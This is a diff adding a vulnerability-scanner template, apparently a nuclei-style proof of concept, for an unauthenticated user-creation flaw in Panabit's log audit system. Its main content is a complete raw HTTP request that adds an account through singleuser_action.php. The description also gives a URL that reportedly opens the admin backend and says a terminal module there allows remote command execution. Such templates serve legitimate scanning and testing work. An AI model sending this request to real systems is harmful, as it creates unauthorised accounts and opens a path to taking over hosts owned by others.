@@ -1,0 +1,24 @@
+id: panabit-singleuser-action-adduser
+
+info:
+  name: panabit日志审计 singleuser_action.php 任意用户添加漏洞
+  author: zan8in
+  severity: high
+  description: |-
+    panabit日志审计存在 singleuser_action.php 任意用户添加漏洞，后台弱存在终端命令模块可rce。
+    访问 https://x.x.x.x/singlelogin.php?userId=26062 即可进入后台.
+    
+http:
+  - raw:
+      - |-
+        POST /singleuser_action.php HTTP/2
+        Host: {{Hostname}}
+        Content-Type: application/json
+        User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36
+
+        {"syncInfo": { "user": { "userId": "33432", "userName": "sopkod", "employeeId": "119", "departmentId": "119", "departmentName": "119", "coporationId": "119", "corporationName": "119", "userSex": "1",  "userDuty": "119", "userBirthday": "119", "userPost": "119", "userPostCode": "119", "userAlias": "119", "userRank": "119", "userPhone": "119", "userHomeAddress": "119", "userMobilePhone": "119", "userMailAddress": "119", "userMSN": "119", "userNt": "119", "userCA": "119", "userPwd": "119", "userClass": "119", "parentId": "119", "bxlx": "119" },"operationType": "ADD_USER" } }
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '{"yn":"yes","str":"OK"}'
